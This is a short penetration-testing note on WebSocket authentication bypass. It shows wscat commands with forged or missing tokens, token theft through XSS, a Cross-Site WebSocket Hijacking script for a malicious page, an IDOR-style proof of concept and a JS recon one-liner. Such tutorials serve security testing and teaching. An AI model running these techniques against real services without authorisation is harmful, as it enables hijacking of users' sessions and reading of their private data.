[[WebSocket]]
 
 WebSocket (wss:// or ws://) is a communication protocol used for real-time features To connect to a WebSocket server, the client usually sends a URL like:

```
wss://example.com/ws?token=eyJhbGciOiJIUzI1...
```

The token is supposed to verify the user's identity.

### How to Find WebSocket Auth Bypass

#### Identify WebSocket Usage

In browser DevTools → Network tab → filter by "WS"

Look for URLs like:

```
wss://api.target.com/ws?token=...
OR
wss://chat.example.com/socket
```
 Check if they contain 
 - token=
- auth=
- session ID
- org ID
- email/username

#### Analyze the Initial Handshake
Use tools like:

```
# Using wscat (Node.js)
wscat -c "wss://target.com/ws?token=xyz123"


# Or using curl-like syntax with websocat
websocat "wss://target.com/ws"
```

Watch what happens:

- Do you get a response?
- Can you send/receive messages?
- Try removing the token or sending a forged one.

#### Test These Exploit Techniques

1. Use Invalid Token
Try replacing the token with garbage:

```
wscat -c "wss://target.com/ws?token=FAKE123"
```

If you're still connected and can receive messages — auth is broken.

2. No Token at All
```
wscat -c "wss://target.com/ws"
```

If it works, there's no auth at all.

3. Reuse Victim's Token from LocalStorage or URL
If token is in JavaScript or exposed in source:

```
const socket = new WebSocket("wss://target.com/ws?token=" + localStorage.token);
```

You can steal it via XSS, or even Wayback Machine.

4. Session Cookies Automatically Sent?
If backend only checks for cookies and not WebSocket origin, try CSWSH (Cross-Site WebSocket Hijacking):

- Host malicious HTML page
- Auto-connect WebSocket from victim's browser
- Cookies will be sent!

```js
<script>
  const ws = new WebSocket("wss://target.com/ws");
  ws.onmessage = e => console.log(e.data);
</script>
```

Victim's browser sends session cookie → you get their real-time data.

#### Example PoC (Full Flow)
Let's say a chat app uses:

```
wss://chat.vulnerablesite.com/socket?user_id=123&token=abc
```

You try:
```
wscat -c "wss://chat.vulnerablesite.com/socket?user_id=456&token=123456"
```

You send this message:
```
{"action": "read_messages", "room_id": "admin"}
```

If server replies with actual data, you've bypassed auth.

Tools and their purpose: 
wscat → Interact manually
websocat → Script automation
Burp Suite → Intercept WebSocket handshake 

#### Recon tips 
Use gau, waybackurls, or github-dorks to find JS files:
```
cat urls.txt | grep ".js" | while read url; do curl -s $url | grep -i websocket; done
```

Search for code like:
```
new WebSocket("wss://")
```

### Reference 
https://freedium.cfd/https://infosecwriteups.com/exploiting-websocket-authentication-bypass-3d2c998fc062